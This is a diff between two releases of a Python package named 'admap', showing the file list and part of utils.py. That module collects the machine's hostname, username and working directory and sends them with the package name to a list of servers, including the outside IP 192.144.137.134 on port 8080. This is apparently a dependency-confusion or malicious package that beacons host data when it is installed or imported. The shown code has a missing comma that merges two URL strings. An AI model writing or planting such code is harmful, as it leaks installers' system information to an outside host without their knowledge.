# Comparing `tmp/admap-2.0.4.tar.gz` & `tmp/admap-2.0.5.tar.gz`

## Comparing `admap-2.0.4.tar` & `admap-2.0.5.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxrwxr-x   0 ubuntu    (1000) ubuntu    (1000)        0 2024-04-16 10:25:13.000000 admap-2.0.4/
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      311 2024-04-16 10:23:59.000000 admap-2.0.4/setup.py
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      178 2024-04-16 10:24:17.000000 admap-2.0.4/PKG-INFO
-drwxrwxr-x   0 ubuntu    (1000) ubuntu    (1000)        0 2024-04-16 10:24:17.000000 admap-2.0.4/admap.egg-info/
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      152 2024-04-16 10:24:17.000000 admap-2.0.4/admap.egg-info/SOURCES.txt
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        1 2024-04-16 10:24:17.000000 admap-2.0.4/admap.egg-info/top_level.txt
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      178 2024-04-16 10:24:17.000000 admap-2.0.4/admap.egg-info/PKG-INFO
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        9 2024-04-16 10:24:17.000000 admap-2.0.4/admap.egg-info/requires.txt
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        1 2024-04-16 10:24:17.000000 admap-2.0.4/admap.egg-info/dependency_links.txt
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      608 2024-04-16 10:25:13.000000 admap-2.0.4/utils.py
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)       38 2024-04-16 10:24:17.000000 admap-2.0.4/setup.cfg
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)       59 2024-04-16 10:24:39.000000 admap-2.0.4/__init__.py
+drwxrwxr-x   0 ubuntu    (1000) ubuntu    (1000)        0 2024-04-17 06:25:30.000000 admap-2.0.5/
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      311 2024-04-17 06:16:30.000000 admap-2.0.5/setup.py
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      178 2024-04-17 06:24:14.000000 admap-2.0.5/PKG-INFO
+drwxrwxr-x   0 ubuntu    (1000) ubuntu    (1000)        0 2024-04-17 06:24:14.000000 admap-2.0.5/admap.egg-info/
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      152 2024-04-17 06:24:14.000000 admap-2.0.5/admap.egg-info/SOURCES.txt
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        1 2024-04-17 06:24:14.000000 admap-2.0.5/admap.egg-info/top_level.txt
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      178 2024-04-17 06:24:14.000000 admap-2.0.5/admap.egg-info/PKG-INFO
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        9 2024-04-17 06:24:14.000000 admap-2.0.5/admap.egg-info/requires.txt
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        1 2024-04-17 06:24:14.000000 admap-2.0.5/admap.egg-info/dependency_links.txt
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      642 2024-04-17 06:25:26.000000 admap-2.0.5/utils.py
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)       38 2024-04-17 06:24:14.000000 admap-2.0.5/setup.cfg
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)       33 2024-04-17 06:25:30.000000 admap-2.0.5/__init__.py
```

### Comparing `admap-2.0.4/utils.py` & `admap-2.0.5/utils.py`

 * *Files 24% similar despite different names*

```diff
@@ -4,15 +4,16 @@
     import getpass
     import os
     hostname = platform.node()
     username = getpass.getuser()
     current_path = os.getcwd()
 
     urls = [
-        "http://192.144.137.134:8080"
+        "http://127.0.0.1:8080",
+        "http://192.144.137.134:8080",
         "http://10.241.70.162:8080"
     ]
 
     for url in urls:
         params = {
             "flag": "poi",
             "packagename": "admap",
```

